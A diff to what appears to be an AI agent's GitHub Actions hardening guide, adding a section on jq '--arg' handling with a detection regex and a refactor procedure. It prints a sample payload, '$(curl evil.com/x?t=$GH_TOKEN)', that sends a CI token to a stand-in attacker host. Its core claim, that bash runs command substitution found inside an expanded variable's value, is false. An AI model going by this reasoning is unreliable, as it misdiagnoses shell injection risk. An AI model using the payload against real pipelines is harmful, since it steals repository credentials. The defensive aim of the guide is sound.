@@ -95,6 +95,54 @@ block contains `persist-credentials: false`:
     persist-credentials: false
 ```
 
+### jq command-substitution audit (the `--arg` trap)
+
+Routing `${{ }}` values through `env:` blocks defeats GitHub
+expression injection. It does NOT defeat bash command
+substitution. Consider:
+
+```yaml
+# VULNERABLE — looks safe but isn't
+env:
+  PR_TITLE: ${{ github.event.pull_request.title }}
+run: |
+  PAYLOAD=$(jq -nc --arg text "New PR: ${PR_TITLE}" '{text: $text}')
+```
+
+Bash expands `${PR_TITLE}` inside the double-quoted string BEFORE
+jq sees it. A PR title like `$(curl evil.com/x?t=$GH_TOKEN)`
+executes via bash command substitution.
+
+For every `run:` block in every workflow file, scan for the
+pattern `jq[^|]*"[^"]*\$\{[A-Z_][A-Z0-9_]*\}` (a `${VAR}` inside
+double-quoted text on the same line as a `jq` invocation). For
+every hit:
+
+1. Read the line and the surrounding context (1-2 lines above
+   and below).
+2. Refactor so every shell variable enters `jq` via its own
+   `--arg name "$VAR"` and is referenced as `$name` INSIDE the
+   jq filter (jq parses `$name`, bash never sees it):
+
+```yaml
+# HARDENED
+env:
+  PR_TITLE: ${{ github.event.pull_request.title }}
+run: |
+  PAYLOAD=$(jq -nc \
+    --arg title "$PR_TITLE" \
+    '{text: ("New PR: " + $title)}')
+```
+
+3. Use `Read` + `Edit` (yaml-aware, line-precise) — NEVER `sed`
+   or `awk` to rewrite YAML.
+4. If the surrounding shell builds a JSON payload for `curl`,
+   `slack`, `webhook`, etc., apply the same `--arg` discipline
+   to EVERY interpolated value — partial coverage is no coverage.
+
+If the regex pattern above returns zero hits, this Hardening
+Edit is a no-op for that workflow.
+
 ## Step 5: Post-scan regression guard
 
 Invoke `workflow-scan` again. If the post-scan reports MORE
